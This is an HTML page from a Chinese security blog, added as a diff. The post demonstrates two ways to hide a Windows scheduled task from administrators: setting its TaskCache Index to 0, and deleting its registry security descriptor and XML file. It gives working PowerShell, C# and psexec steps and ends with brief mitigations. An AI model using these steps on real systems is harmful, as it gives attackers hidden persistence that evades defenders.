@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<head>
+
+	<title>poions blog</title>
+	<meta name="keywords" content="" />
+	<meta name="description" content="" />
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<link href="/css/bootstrap.min.css" rel="stylesheet" type="text/css">
+	<link href="/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+	<link href="/css/templatemo_style.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+	<div class="templatemo-logo visible-xs-block">
+		<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12 black-bg logo-left-container">
+			<h1 class="logo-left">Black</h1>
+		</div>
+		<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12 white-bg logo-right-container">
+			<h1 class="logo-right">White</h1>
+		</div>
+	</div>
+	<div class="templatemo-container">
+		<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12 black-bg left-container">
+			<h1 class="logo-left hidden-xs margin-bottom-60">Black</h1>
+			<div class="tm-left-inner-container">
+				<ul class="nav nav-stacked templatemo-nav">
+				  <li><a href="\index.html"><i class="fa fa-home fa-medium"></i>首页</a></li>
+				  <li><a href="\web.html" class="active"><i class="fa fa-shopping-cart fa-medium"></i>安全攻防</a></li>
+				  <li><a href="\ctf.html"><i class="fa fa-send-o fa-medium"></i>CTF</a></li>
+				  <li><a href="\zawen.html"><i class="fa fa-comments-o fa-medium"></i>杂文</a></li>
+				  <li><a href="\contact.html"><i class="fa fa-envelope-o fa-medium"></i>联系方式</a></li>
+				</ul>
+			</div>
+		</div>
+		<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12 white-bg right-container">
+			<h1 class="logo-right hidden-xs margin-bottom-60">White</h1>
+			<div class="tm-right-inner-container">
+				<h1 class="templatemo-header"><strong>Windows计划任务隐匿姿势分享</strong></h1>
+				<article class="templatemo-item">
+				 </br>
+		<h1 class="templatemo-header"><strong>0x01 背景</strong></h1>
+		<strong>
+			恶意软件或攻击者通常使用计划任务常常作为Windows系统下被利用最频繁的工具之一，许多蠕虫木马均使用到计划任务的方式来达到它们的目的，也包括一些后门通信、心跳发送等。本文介绍的计划任务隐匿姿势来自于青藤实验室-REInject@73lab发布的一篇原创文章，非常感谢原创作者的分享贡献；此种技术其实不算是新技术，于2020年的时候这边通过捕捉到的一个2019年3月就已经运用此技术的木马；下面就来实践一下！
+		</strong>
+			<img src="images\2021061201.png" alt="frist" class="img-thumbnail">
+
+			<hr/>
+			
+			
+			<h1 class="templatemo-header"><strong>0x02 Windows计划任务的创建方式</strong></h1>
+			<p>可通过界面直接创建任务的方式设置一个定时执行的任务；也可以通过创建本地XML文件的方式导入任务规则，该方式在部分Windows版本会出现XML格式不兼容的情况，导致出现错误弹窗，计划任务管理界面无法获取到任务，但实际上可以正常工作的情况出现先。</p>
+			<img src="images\2021061202.png" alt="frist" class="img-thumbnail">
+			<p>将文件放置在C:\Windows\System32\Tasks下的任意文件夹内</p>
+			<img src="images\2021061203.png" alt="frist" class="img-thumbnail">
+			<p>其余的可以通过at、schtasks.exe等创建方式创建计划任务；然后就是计划任务注册表项对应关键信息数据;在一次应急排查中，只能从计划任务日志中看到恶意计划任务在周期性的执行，但却无法通过 taskschd.msc 或 schtasks 查询到恶意任务，并且通过排查 %SystemRoot%\System32\Tasks 目录后仍无法找到它。
+				在测试中发现，创建计划任务 test 后，无论是手动修改任务 xml 文件，还是删除任务 xml 文件，都无法影响该任务的运行。于是对注册表项进行监控，发现在创建任务后，下面的注册表项发生变化：</p>
+			<pre>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Schedule</pre>
+			<p>下面是从 winreg-kb 项目中得到该注册表对应的信息，在 XP 时，计划任务注册表路径为：</p>
+			<pre>HKEY_LOCAL_MACHINE\Software\Microsoft\SchedulingAgent</pre>
+			
+			<p>Win7 以后发生变化，变成</p>
+			<pre>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Schedule</pre>
+			<p>子项有：</p>
+			<table border="1">
+				<tr>
+					<th>名称</th>
+					<th>描述</th>
+				</tr>
+				<tr>
+					<td>Aliases</td>
+					<td>存储AtServiceAccount，默认NT AUTHORITY\System</td>
+				</tr>
+				<tr>
+					<td>CompatibilityAdapter</td>
+					<td></td>
+				</tr>
+				<tr>
+					<td>Configuration</td>
+					<td></td>
+				</tr>
+				<tr>
+					<td>CredWom</td>
+					<td></td>
+				</tr>
+				<tr>
+					<td>Handlers</td>
+					<td></td>
+				</tr>
+				<tr>
+					<td>Handshake</td>
+					<td></td>
+				</tr>
+				<tr>
+					<td>TaskCache</td>
+					<td>存储任务项信息</td>
+				</tr>
+			</table>
+			<p>任务项信息除了在磁盘中的 <pre>%SystemRoot%\System32\Tasks</pre>下之外，还在下面的注册表项中存在：</p>
+			<pre>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache</pre>
+			<p>Schedule\TaskCache :</p>
+			<table border="1">
+				<tr>
+					<th>名称</th>
+					<th>描述</th>
+				</tr>
+				<tr>
+					<td>Boot</td>
+					<td></td>
+				</tr>
+				<tr>
+					<td>Logon</td>
+					<td></td>
+				</tr>
+				<tr>
+					<td>Plain</td>
+					<td></td>
+				</tr>
+				<tr>
+					<td>Plain</td>
+					<td></td>
+				</tr>
+				<tr>
+					<td>Tree</td>
+					<td></td>
+				</tr>
+
+			</table>
+			<p>TaskCache\Tree 子项以任务名称命名，每个任务下的 Value 结构如下：</p>
+			<table border="1">
+				<tr>
+					<th>名称</th>
+					<th>类型</th>
+					<th>描述</th>
+				</tr>
+				<tr>
+					<td>Id</td>
+					<td>REG_SZ</td>
+					<td>{GUID},任务对应的guid编号</td>
+				</tr>
+				<tr>
+					<td>Index</td>
+					<td>REG_DWORD</td>
+					<td>一般任务为3，其他值未知</td>
+				</tr>
+				<tr>
+					<td>SD</td>
+					<td>REG_BINARY</td>
+					<td>该任务项的安全描述信息，二进制值，结构未知</td>
+				</tr>
+			</table>
+			<p>每个 Schedule\TaskCache\Tasks\%GUID% 对应一个任务，有这些 Value :</p>
+			<table border="1">
+				<tr>
+					<th>名称</th>
+					<th>类型</th>
+					<th>描述</th>
+				</tr>
+				<tr>
+					<td>Actions</td>
+					<td>REG_BINARY</td>
+					<td>二进制值，动作信息，中间包含 UNICODE 形式 COMMAND 信息</td>
+				</tr>
+				<tr>
+					<td>Date</td>
+					<td>REG_SZ</td>
+					<td>任务创建日期</td>
+				</tr>
+				<tr>
+					<td>Description</td>
+					<td>REG_SZ</td>
+					<td>任务描述</td>
+				</tr>
+				<tr>
+					<td>DynamicInfo</td>
+					<td>REG_BINARY</td>
+					<td>Win7 以下 28 位，Win8 以上 32 位</td>
+				</tr>
+				<tr>
+					<td>Hash</td>
+					<td>REG_BINARY</td>
+					<td>SHA-256 or CRC32, 疑似对应 xml 文件 Hash</td>
+				</tr>
+				<tr>
+					<td>Path</td>
+					<td>REG_SZ</td>
+					<td>在 TaskCache\Tree 中的任务路径</td>
+				</tr>
+				<tr>
+					<td>Schema</td>
+					<td>REG_BINARY</td>
+					<td>该任务项的安全描述信息，二进制值，结构未知</td>
+				</tr>
+				<tr>
+					<td>Triggers</td>
+					<td>REG_BINARY</td>
+					<td>进制，触发器信息</td>
+				</tr>
+				<tr>
+					<td>URI</td>
+					<td>REG_SZ</td>
+					<td>任务路径</td>
+				</tr>
+			</table>
+			<p>如果是 at 命令创建的计划任务，对应的注册表位置在</p>
+			<pre>Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\At1</pre>
+
+			<hr/>
+			
+			<h1 class="templatemo-header"><strong>0x03 计划任务的安全描述符（SD）</strong></h1>	
+			<p>计划任务的 SD 配置在注册表中的位置</p>
+			<p><pre>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\{TaskName}\SD</pre></p>
+			<p>为人类不可读的二进制格式：</p>
+			<img src="images\2021061204.png" alt="frist" class="img-thumbnail">
+			<p>在一篇关于隐藏windows服务的文章中，了解到通过修改对象的安全描述信息可以达到隐藏的目的。触类旁通一下，计划任务的隐藏应该也是可以通过改变安全描述信息（SD）实现。</p>
+			<p>Windows 自带的工具 schtasks.exe 并不支持 sd 的设置，需要通过 API 实现。通过查阅 MSDN 并未发现对于 TASK 的 SDDL 该怎么写，相关 API 列表:</p>
+			<ul>
+				<li>IRegistrationInfo::put_SecurityDescriptor </li>
+				<li>ITaskFolder::CreateFolder</li>
+				<li>ITaskFolder::CreateFolder</li> 
+				<li>ITaskFolder::RegisterTaskDefinition 
+				<li> ITaskFolder::SetSecurityDescriptor </li>
+				<li>IRegisteredTask::SetSecurityDescriptor</li>
+			</ul>
+			<p>通过这些 API 可以实现设置 TASK 的 SD 信息。我尝试使用项目 TaskScheduler 进行任务的创建，它用起来会更方便一些：</p>
+			<pre>
+using System;
+using System.Security.Principal;
+using System.Security.AccessControl;
+using Microsoft.Win32.TaskScheduler;
+namespace SchTaskOpt
+{
+	class Program
+	{
+		static void Main(string[] args)
+		{
+			TaskDefinition td = TaskService.Instance.NewTask();
+			td.RegistrationInfo.Description = "do something";
+			td.Principal.RunLevel = TaskRunLevel.Highest;
+			td.Principal.LogonType = TaskLogonType.ServiceAccount;
+			td.Principal.UserId = "SYSTEM";
+			td.RegistrationInfo.SecurityDescriptorSddlForm = @"D:P(D;;DCLCWPDTSD;;;IU)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)";
+		DailyTrigger dt = new DailyTrigger();
+			dt.StartBoundary = DateTime.Now;
+			dt.DaysInterval = 1;
+			dt.Repetition.Interval = TimeSpan.FromMinutes(1);
+			//td.Triggers.Add(dt);
+			td.Actions.Add("notepad", null, null);
+			Task t =  TaskService.Instance.RootFolder.RegisterTaskDefinition(path:"test2", definition:td, TaskCreation.CreateOrUpdate, null, null, TaskLogonType.ServiceAccount);
+			Console.WriteLine("success!!");
+			//TaskSecurity ts = new TaskSecurity(t);
+			//ts.AddAccessRule(new TaskAccessRule(new SecurityIdentifier(WellKnownSidType.AuthenticatedUserSid, null), TaskRights.Read | TaskRights.Write | TaskRights.ReadAttributes, AccessControlType.Deny));
+			//t.SetAccessControl(ts);
+		Console.WriteLine("success!!");
+			}
+	}
+}
+			</pre>
+			<p>但不幸的是报错了，无论是通过管理员运行还是 SYSTEM，都无法另其正常运作：</p>
+			<pre>
+PS C:\source\SchTaskOpt\bin\> .\SchTaskOpt.exe
+未经处理的异常:  System.Runtime.InteropServices.COMException: 异常来自 HRESULT:0xD0000061
+在 Microsoft.Win32.TaskScheduler.V2Interop.ITaskFolder.RegisterTaskDefinition(String Path, ITaskDefinition pDefinition, Int32 flags, Object UserId, Object password, TaskLogonType LogonType, Object sddl)
+在 Microsoft.Win32.TaskScheduler.TaskFolder.RegisterTaskDefinition(String path, TaskDefinition definition, TaskCreation createType, String userId, String password, TaskLogonType logonType, String sddl)				
+			</pre>
+			<p>这个疑问先保留一下吧，需要清楚知道注册表中每个任务自动生成的 SD 格式才有头绪，这份类型结构清点也许会排上用场。</p>
+			<p>下面进行实践一下给出的两种隐匿方式,第一种：
+				如果想要隐藏一个计划任务，可以通过修改 Schedule\TaskCache\Tree 中对应任务的 Index 值，一般情况下都是 3，步骤如下：</p>
+				<ul>
+					<li>启动 SYSTEM 权限 <pre>cmd：psexec64 -i -s cmd.exe</pre></li>
+					<li>执行 regedit 以 SYSTEM 权限启动注册表编辑器</li>
+					<li>修改<pre>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree</pre>下对应任务的 Index 值为 0</li> 
+					<li>删除<pre>%SystemRoot%\System32\Tasks</pre>下任务对应的 XML 文件</li>
+					<li>优点： - 利用 taskschd.msc、schtasks 甚至系统API查询出的所有任务中，都看不到该任务</li>
+					<li>- 并非完全隐藏，如果知道该任务的名字，可以通过<pre>schtasks /query /tn {TaskName} </pre>查到 - 无论是低权的任务还是高权，都需要 SYSTEM 权限（在win10测试，低版本好像没这个要求，待测试）</li>
+				</ul>
+
+			<hr/>
+
+			<h1 class="templatemo-header"><strong>0x04 测试用例</strong></h1>
+			<pre>
+PS C:\> schtasks.exe /create /tn test /tr "calc.exe" /sc minute /mo 1 /ru "administrator"
+成功: 成功创建计划任务 "test"。
+PS C:\> schtasks.exe /query /tn test
+文件夹: \
+任务名                                   下次运行时间           模式
+======================================== ====================== ===============
+test                                     2021/1/11 14:54:00     就绪
+PS C:\> schtasks.exe /query|findstr test
+test                                     2021/1/11 14:55:00     ??
+PS C:\> Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\test" -Name "Index" -Value 0
+PS C:\> schtasks.exe /query|findstr test
+PS C:\> schtasks.exe /delete /tn test /f
+成功: 计划的任务 "test" 被成功删除。
+PS C:\>
+			</pre>
+			
+			<p>第二种，通过配置任务 SD 实现，删除了注册表中的 SD 项，发现无论什么方式都查不到任务信息，达到完全隐藏的目的：</p>
+			<ul>
+				<li>启动 SYSTEM 权限 cmd： <pre>psexec64 -i -s cmd.exe</pre></li>
+				<li>执行 regedit 以 SYSTEM 权限启动注册表编辑器</li>
+				<li>删除<pre>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\{TaskName}\SD</pre></li> 
+				<li>删除<pre>%SystemRoot%\System32\Tasks</pre>下任务对应的 XML 文件</li>
+				<li>优点：无论何种方式（除了注册表），都查不到该任务，较为彻底</li>
+				<li>缺点: 无论是低权的任务还是高权，都需要 SYSTEM 权限</li>
+			</ul>
+			<br>
+			
+			<p>下面是测试用的 powershell 代码（不通用，里面涉及的二进制内容需要先dump一个正常创建的任务）：</p>
+			<pre>
+$taskname = "test"
+$uuid = "{3EC79FBB-0533-4356-89B3-8CE2003F1CD8}"
+$cmd = "calc.exe"
+New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\" -Name $uuid
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$uuid\" -Name "Path" -Value "\$taskname" -Type String -Force
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$uuid\" -Name "URI" -Value "\$taskname" -Type String -Force
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$uuid\" -Name "Schema" -Value 0x00010002 -Type DWORD -Force
+$triggerstring = "FwAAAAAAAAABBwEAAAAIAAAI/NDz5dYBAAcBAAAACAD//////////zghQUNISEhI38PL80hISEgOAAAASEhISEEAdQB0AGgAbwByAAAASEgAAAAASEhISABISEhISEhIAEhISEhISEgBAAAASEhISBwAAABISEhIAQUAAAAAAAUVAAAAEXy5KUkCH0AHyc8n6AMAAEhISEgsAAAASEhISFQARQBDAEgATABJAFUAMQAwADUANwBcAHQAZQBjAGgAbABpAHUAAAAAAAAASEhISCwAAABISEhIWAIAABAOAACA9AMA/////wcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABISEhI3d0AAAAAAAABBwEAAAAIAAAI/NDz5dYBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8AAAAAAAAAP////8AAAAAAAAAAAAAAAAAAcVLAQAAAAAAAAB2oQAAAAAAAEhISEg="
+$triggerbytes = [System.Convert]::FromBase64String($triggerstring)
+$actionbytes = [byte[]](0x03,0x00,0x0c,0x00,0x00,0x00,0x41,0x00,0x75,0x00,0x74,0x00,0x68,0x00,0x6f,0x00,0x72,0x00,0x66,0x66,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00) + [System.Text.Encoding]::Unicode.GetBytes($cmd) + [byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$uuid\" -Name "Triggers" -Value $triggerbytes -Type binary -Force
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$uuid\" -Name "Actions" -Value $actionbytes -Type binary -Force
+New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree" -Name $taskname -Force
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskname" -Name "Id" -Value "{3EC79FBB-0533-4356-89B3-8CE2003F1CD8}" -Type string -Force
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskname" -Name "Index" -Value 0x3 -Type DWORD -Force
+#Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskname" -Force
+#Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$uuid" -Force
+				</pre>
+				<p>更通用一些的测试用例：</p>
+				<pre>
+PS C:\> schtasks.exe /create /tn test /tr "calc.exe" /sc minute /mo 1 /ru "administrator"
+成功: 成功创建计划任务 "test"。
+PS C:\> schtasks.exe /query /tn test
+文件夹: \
+任务名                                   下次运行时间           模式
+======================================== ====================== ===============
+test                                     2021/1/11 14:56:00     就绪
+PS C:\> schtasks.exe /query|findstr test
+test                                     2021/1/11 14:56:00     ??
+PS C:\> Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\test" -Name "SD"
+PS C:\> schtasks.exe /query /tn test
+错误: 系统找不到指定的文件。
+PS C:\> schtasks.exe /query|findstr test
+PS C:\>
+			</pre>
+			<p>这种方式创建的计划任务，删除要相对麻烦一些：</p>
+			<pre>
+$taskname = "test"
+$uuid = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskname" -Name "Id").Id
+Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$uuid"
+Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskname"
+sc.exe stop schedule
+sc.exe start schedule
+			</pre>
+			<img src="images\2021061205.png" alt="frist" class="img-thumbnail">
+			<p>SD已被删除，界面和命令均无法查找出该任务，但任务依然存在工作着！</p>
+			<img src="images\2021061206.png" alt="frist" class="img-thumbnail">
+			<hr/>
+
+			<h1 class="templatemo-header"><strong>0x05 测试用例</strong></h1>
+			<ul>
+				<li>配置计划任务只允许运行在认证用户上，不可以通过 SYSTEM 账户运行，可以在 GPO 中进行配置，参考<a href="https://onedrive.live.com/view.aspx?resid=638CC35BD0951BBC%211112&id=documents&wd=target%28%E5%8D%9A%E5%AE%A2.one%7CD24D66B0-3352-46ED-8677-7E270B20F087%2F%29
+					onenote:https://d.docs.live.net/638cc35bd0951bbc/gian%20的笔记本/博客.one#Windows计划任务隐匿姿势分享&section-id={D24D66B0-3352-46ED-8677-7E270B20F087}&page-id={6FAF4FB8-CE5D-4D21-974F-D437D162B67C}&object-id={14FE9585-8FD4-4776-9854-1E483D725E6D}&C0"> Allow server operators to schedule tasks</a></li>
+				<li>配置只允许 administrators 用户组对进程的优先级进行修改，可以在 GPO 中配置，参考 <a href="https://onedrive.live.com/view.aspx?resid=638CC35BD0951BBC%211112&id=documents&wd=target%28%E5%8D%9A%E5%AE%A2.one%7CD24D66B0-3352-46ED-8677-7E270B20F087%2F%29
+					onenote:https://d.docs.live.net/638cc35bd0951bbc/gian%20的笔记本/博客.one#Windows计划任务隐匿姿势分享&section-id={D24D66B0-3352-46ED-8677-7E270B20F087}&page-id={6FAF4FB8-CE5D-4D21-974F-D437D162B67C}&object-id={14FE9585-8FD4-4776-9854-1E483D725E6D}&C5">Increase scheduling priority</a></li>
+			</ul>
+
+			<hr/>
+			
+			<h1 class="templatemo-header"><strong>0x05 参考</strong></h1>
+			<ul>
+				<li>https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page</li>
+				<li>https://docs.microsoft.com/en-us/previous-versions/windows/desktop/automat/bstr</li>
+				<li>https://docs.microsoft.com/en-us/windows/application-management/svchost-service-refactoring</li>
+				<li>https://nasbench.medium.com/a-deep-dive-into-windows-scheduled-tasks-and-the-processes-running-them-218d1eed4cce</li>
+				<li>https://attack.mitre.org/techniques/T1053/002/</li>
+				<li>https://attack.mitre.org/techniques/T1053/005/</li>
+				<li>https://github.com/libyal/winreg-kb/blob/master/documentation/Task%20Scheduler%20Keys.asciidoc</li>
+				<li>https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/</li>
+				<li>https://github.com/dahall/TaskScheduler</li>
+				<li>https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page</li>
+				<li>https://paper.seebug.org/1464/#_4</li>
+			</ul>	
+
+			</br>
+			</br>
+						by<span class="blue">：2021年6月12号</span><span class="green">20:10</span>.</p>
+				<br/>
+
+
+
+		<!-- 文章修改 -->
+
+
+			</span>
+			</article>
+				</footer>
+			</div>
+		</div> <!-- right section -->
+	</div>
+</body>
+</html>
